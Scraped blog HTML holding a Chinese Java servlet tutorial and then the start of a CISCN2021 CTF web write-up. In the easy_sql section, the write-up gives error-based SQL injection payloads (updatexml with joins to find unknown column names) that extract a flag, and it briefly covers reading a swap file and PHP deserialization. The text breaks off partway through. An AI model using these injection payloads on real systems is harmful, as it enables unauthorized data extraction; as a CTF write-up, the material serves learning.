title="tomcat目录结构"></a>tomcat目录结构</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bin，用于存放Tomcat的各种配置文件，比如，web.xml、server.xml</span><br><span class="line">lib，用于存放Tomcat服务器，和所有Web应用程序需要访问的JAR文件</span><br><span class="line">logs，用于存放Tomcat的日志文件</span><br><span class="line">temp，用于存放Tomcat运行时，产生的临时文件</span><br><span class="line">webapps，Web应用程序的主要发布目录，通常将要发布的应用程序放到这个目录下</span><br><span class="line">work，Tomcat的工作目录，JSP编译生成的Servlet源文件，和字节码文件放在这个目录下</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60a9f8e30b43a.jpg"></p><h1 id="idea-tomcat部署过程"><a href="#idea-tomcat部署过程" class="headerlink" title="idea tomcat部署过程"></a>idea tomcat部署过程</h1><p><a href="https://blog.csdn.net/qq_28513801/article/details/92838236">https://blog.csdn.net/qq_28513801/article/details/92838236</a></p><h1 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h1><h2 id="什么是servlet"><a href="#什么是servlet" class="headerlink" title="什么是servlet?"></a>什么是servlet?</h2><p>本质上就是一个运行在web容器(web服务器中)的java类，tomcat是web容器中的一个。</p><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用于处理用户的请求并作出响应</span><br></pre></td></tr></table></figure><p>servlet与普通的java程序的区别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.本质上就是一个java类</span><br><span class="line">2.所有的servlet必须实现接口：Servlet</span><br><span class="line">3.运行Tomcat中，web容器中</span><br><span class="line">4.对用户的请求进行处理，并且做出响应</span><br></pre></td></tr></table></figure><p>编写步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.创建一个继承于HttpServlet的类（HttpServlet实现了Servlet接口）</span><br><span class="line">2.重写doGet或doPost方法，分别用来处理浏览器提交的get或post请求</span><br><span class="line">3.配置webapp&#x2F;WEB-INF&#x2F;web.xml 文件，配置Servlet 的访问地址。</span><br></pre></td></tr></table></figure><h2 id="配置Servlet"><a href="#配置Servlet" class="headerlink" title="配置Servlet"></a>配置Servlet</h2><p>写好的Serlvet保存在src目录中</p><p><img src="https://www.hualigs.cn/image/60a9f8e6559d1.jpg"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        PrintWriter writer=resp.getWriter();</span><br><span class="line">        writer.println(<span class="string">&quot;&lt;h1 style=&#x27;color:red&#x27;&gt;11111&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在WEB-INF/web.xml中配置servlet-mapping和servlet-name</p><p><img src="https://www.hualigs.cn/image/60a9f8e47016d.jpg"></p><p>访问效果</p><p><img src="https://www.hualigs.cn/image/60a9f8e47bc5b.jpg"></p><h2 id="servlet生命周期"><a href="#servlet生命周期" class="headerlink" title="servlet生命周期"></a>servlet生命周期</h2><p>一个servlet只会在tomcat容器中实例化一次，且只会产生一个对象，常驻内存，要等到服务器关闭才会销毁。tomcat对它做了多线程处理，这样才能实现一个对象多个请求</p><p>init：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">初始化方法，用户第1次访问的时候会执行1次</span><br></pre></td></tr></table></figure><p>service ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">处理服务请求的方法，每次请求都会执行</span><br></pre></td></tr></table></figure><p>destory：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">销毁方法，服务器关闭的时候执行1次</span><br></pre></td></tr></table></figure><p>继承Servlet类并重写三个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServletDemo</span> <span class="keyword">implements</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span>  ServletException, IOException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问页面后，可以看到执行了service方法</p><p><img src="https://www.hualigs.cn/image/60a9f8e4f3c1e.jpg"></p><h1 id="ServletConfig接口"><a href="#ServletConfig接口" class="headerlink" title="ServletConfig接口"></a>ServletConfig接口</h1><p>在Servlet的配置文件web.xml中，可以使用一个或多个<code>&lt;init-param&gt;</code>标签为servlet配置一些初始化参数。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>mytest<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.myServlet.ConfigServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>name<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>password<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>mytest<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/mytest<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>getInitParameter(“参数”) 通过参数名，得到文件中参数值</p><p>getInitParameterNames() 得到所有参数名字</p><p>tomcat在创建Servlet实例时会自动把上面的初始化参数封装对ServletConfig对象中，并在调用init方法时，把ServletConfig对象传递给servlet。通过ServletConfig对象就可以得到当前servlet的初始化参数信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException</span>&#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        PrintWriter writer=resp.getWriter();</span><br><span class="line">        String name=getInitParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        writer.println(name);</span><br><span class="line"></span><br><span class="line">        Enumeration initParameterNames=getInitParameterNames();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (initParameterNames.hasMoreElements())&#123;</span><br><span class="line"></span><br><span class="line">            String element= (String) initParameterNames.nextElement();</span><br><span class="line">            String value=getInitParameter(element);</span><br><span class="line">            writer.println(<span class="string">&quot;参数名:&quot;</span>+element+<span class="string">&quot;值:&quot;</span>+value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功获取到了配置的信息</p><p><img src="https://www.hualigs.cn/image/60a9f8e50c871.jpg"></p><h1 id="HttpServletRequest-对象"><a href="#HttpServletRequest-对象" class="headerlink" title="HttpServletRequest 对象"></a>HttpServletRequest 对象</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpServletRequestDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException</span>&#123;</span><br><span class="line">        response.setContentType((<span class="string">&quot;text/html;charset=utf-8&quot;</span>));</span><br><span class="line">        PrintWriter writer=response.getWriter();</span><br><span class="line"></span><br><span class="line">        writer.println(request.getMethod());  <span class="comment">//请求方式</span></span><br><span class="line">        writer.println(request.getRequestURI()); <span class="comment">//请求URL</span></span><br><span class="line">        writer.println(request.getProtocol()); <span class="comment">//请求协议</span></span><br><span class="line">        writer.println(request.getQueryString()); <span class="comment">//查询字符</span></span><br><span class="line">        writer.println(request.getHeader(<span class="string">&quot;user-agent&quot;</span>)); <span class="comment">//获取UA</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果</p><p><img src="https://www.hualigs.cn/image/60a9f8e577f11.jpg"></p><h2 id="BeanUtils"><a href="#BeanUtils" class="headerlink" title="BeanUtils"></a>BeanUtils</h2><p>BeanUtils是apache commons 组件的成员之一，用于简化javaBean封装数据的操作。也就是说可以简化获取参数的方式</p><p>先导入包</p><p><img src="https://www.hualigs.cn/image/60a9f8e5ce90c.jpg"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpServletRequestDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.setContentType((<span class="string">&quot;text/html;charset=utf-8&quot;</span>));</span><br><span class="line">        PrintWriter writer = response.getWriter();</span><br><span class="line"></span><br><span class="line">        Map parameterMap = request.getParameterMap();</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            BeanUtils.populate(user,parameterMap);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IllegalAccessException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (InvocationTargetException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        writer.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p>sevlet中的请求会根据作用域的范围分为请求域、会话域、上下文域</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请求域：一个用户的一次请求</span><br><span class="line">会话域：一个用户的所有请求</span><br><span class="line">上下文域：所有用户的所有请求</span><br></pre></td></tr></table></figure><p>范围大小</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求域 &lt; 会话域 &lt; 上下文域</span><br></pre></td></tr></table></figure><p>作用域存值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setAttritube(&quot;键&quot;，“值”) </span><br></pre></td></tr></table></figure><p>取值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getAttritube(&quot;键&quot;) </span><br></pre></td></tr></table></figure><p>删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">removeAttritube(&quot;键&quot;)</span><br></pre></td></tr></table></figure><h2 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h2><p>实现页面跳转，从一个servlet跳转到另一个servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpServletRequestDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.setContentType((<span class="string">&quot;text/html;charset=utf-8&quot;</span>));</span><br><span class="line">        RequestDispatcher requestDispatcher=request.getRequestDispatcher(<span class="string">&quot;demo&quot;</span>);</span><br><span class="line">        requestDispatcher.forward(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跳转到demo</p><p><img src="https://www.hualigs.cn/image/60a9f8e5d85a0.jpg"></p><p>转发的特点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.地址栏不会发生变化，显示的还是上一个servlet的地址</span><br><span class="line">2.一共只有一次请求：请求不断链</span><br><span class="line">3.请求域中数据不会丢失：还是要满足请求不断链。</span><br><span class="line">4.转发中，是一次请求的</span><br></pre></td></tr></table></figure><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpServletRequestDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.sendRedirect(<span class="string">&quot;demo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果</p><p><img src="https://www.hualigs.cn/image/60a9f8e639c19.jpg"></p><p>重定向的特点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.地址栏：有变化，显示新的地址</span><br><span class="line">2.2次请求</span><br><span class="line">3.请求域中的数据：断链就数据丢失了</span><br><span class="line">4.重定向的根目录是：http:&#x2F;&#x2F;localhost:8080&#x2F;不包含项目的访问地址</span><br></pre></td></tr></table></figure><h1 id="HttpServletResponse"><a href="#HttpServletResponse" class="headerlink" title="HttpServletResponse"></a>HttpServletResponse</h1><p>设置响应的状态码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResponseDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.setStatus(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2021 web部分题解</title>
    <link href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h1><p>利用join进行无列名注入，先得到第一个列名为id</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1mm1&#39;) and updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b)c)),0)%23&amp;passwd&#x3D;11&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60a35a85bbd40.jpg"></p><p>继续读取第三个列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1mm1&#39;) and updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c)),0)%23&amp;passwd&#x3D;11&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60a35a859b3ba.jpg"></p><p>读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1mm1&#39;) and updatexml(1,concat(0x7e,(select group_concat(&#96;bac9c1a9-327a-4da1-9d66-cbc840b139a4&#96;) from flag)),0)%23&amp;passwd&#x3D;11&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60a35a8543c34.jpg"></p><h1 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h1><p>访问.index.php.swo得到部分源码，php内置类反序列化，根据提示猜到flag可能在注释里</p><p><img src="https://www.hualigs.cn/image/60a35a84bb4dd.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 